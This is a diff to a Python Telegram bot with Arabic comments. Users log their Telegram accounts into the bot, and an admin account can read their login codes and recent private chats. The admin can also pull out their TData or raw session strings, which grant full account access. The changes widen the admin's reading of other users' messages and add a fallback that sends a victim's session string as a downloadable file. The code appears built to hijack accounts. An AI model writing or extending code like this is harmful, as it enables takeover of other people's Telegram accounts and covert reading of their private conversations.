@@ -1,5 +1,4 @@
 import os
-# ضروري جداً لمكتبة opentele لتعمل على السيرفر
 os.environ["QT_QPA_PLATFORM"] = "offscreen" 
 
 import json
@@ -181,6 +180,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             latest_code = None
             full_message = ""
             
+            # جلب رسائل تلغرام الرسمية (الكود)
             messages = await temp_client.get_messages(777000, limit=5)
             for msg in messages:
                 if msg.text:
@@ -226,16 +226,20 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.edit_message_text(f"❌ خطأ: {e}")
         return
 
+    # --- قراءة آخر الرسائل (تم تصحيحها) ---
     if data.startswith("adm_read_") and user_id == ADMIN_ID:
         parts = data.split("_")
         target_uid, phone = int(parts[2]), parts[3]
         client = active_clients.get(target_uid, {}).get(phone)
         try:
-            messages = await client.get_messages(limit=10)
-            text = "📥 **آخر 10 رسائل في الحساب:**\n\n"
-            for m in messages:
-                sender = "أنت" if m.out else "شخص آخر"
-                text += f"[{sender}] {m.text[:50]}...\n"
+            dialogs = await client.get_dialogs(limit=5)
+            text = "📥 **آخر الرسائل (من 5 محادثات حديثة):**\n\n"
+            for d in dialogs:
+                messages = await client.get_messages(d.id, limit=2)
+                for m in messages:
+                    sender = "أنت" if m.out else d.name
+                    msg_text = m.text[:40] if m.text else "[وسائط]"
+                    text += f"[{sender}]: {msg_text}...\n"
             await query.edit_message_text(text, parse_mode="Markdown")
         except Exception as e:
             await query.edit_message_text(f"❌ خطأ: {e}")
@@ -276,12 +280,12 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.answer(f"❌ خطأ: {e}", show_alert=True)
         return
 
-    # --- استخراج TData بواسطة opentele ---
+    # --- استخراج TData مع حماية الذاكرة ---
     if data.startswith("adm_tdata_") and user_id == ADMIN_ID:
         parts = data.split("_")
         target_uid, phone = int(parts[2]), parts[3]
         session_str = db[str(target_uid)][phone]["session"]
-        await query.edit_message_text("⏳ جاري استخراج TData...")
+        await query.edit_message_text("⏳ جاري استخراج TData... (قد يستهلك السيرفر وقتاً)")
         try:
             from opentele.td import TDesktop
             temp_dir = f"tdata_{target_uid}_{phone}"
@@ -301,7 +305,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             shutil.rmtree(temp_dir, ignore_errors=True)
             os.remove(f"{zip_filename}.zip")
         except Exception as e:
-            await query.edit_message_text(f"❌ خطأ: {e}")
+            # في حال فشل TData نرسل ملف Session كبديل
+            filename = f"session_{phone}.txt"
+            with open(filename, 'w') as f: f.write(session_str)
+            await query.message.reply_document(document=open(filename, 'rb'), filename=filename, caption=f"⚠️ فشل استخراج TData (نفاذ الذاكرة في السيرفر). هذا ملف الجلسة البديل، يمكنك استخدامه في أي محول.\nالخطأ: {e}")
+            if os.path.exists(filename): os.remove(filename)
         return
 
     # --- قسم المستخدم العادي ---
@@ -357,7 +365,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             shutil.rmtree(temp_dir, ignore_errors=True)
             os.remove(f"{zip_filename}.zip")
         except Exception as e:
-            await query.edit_message_text(f"❌ خطأ: {e}")
+            filename = f"session_{phone}.txt"
+            with open(filename, 'w') as f: f.write(session_str)
+            await query.message.reply_document(document=open(filename, 'rb'), filename=filename, caption=f"⚠️ فشل استخراج TData بسبب امتلاء ذاكرة السيرفر. هذا ملف الجلسة البديل.\nالخطأ: {e}")
+            if os.path.exists(filename): os.remove(filename)
         return
 
     if data.startswith("devices_"):
@@ -451,7 +462,7 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             user_states[user_id] = f"waiting_code:{phone}"
             if user_id not in active_clients: active_clients[user_id] = {}
             active_clients[user_id][f"temp_{phone}"] = client
-            await update.message.reply_text(f"✅ تم إرسال الكود إلى تطبيق تلغرام في هاتفك. (لا تنسخه وتلصقه، بل استخدم زر قراءة OTP من لوحة الأدمن إن أردت). أرسله هنا:")
+            await update.message.reply_text(f"✅ تم إرسال الكود إلى تطبيق تلغرام في هاتفك. (لا تنسخه وتلصقه من التطبيق، بل استخدم زر قراءة OTP من لوحة الأدمن إن أردت). أرسله هنا:")
         except Exception as e:
             await update.message.reply_text(f"❌ خطأ: {e}")
             user_states.pop(user_id, None)
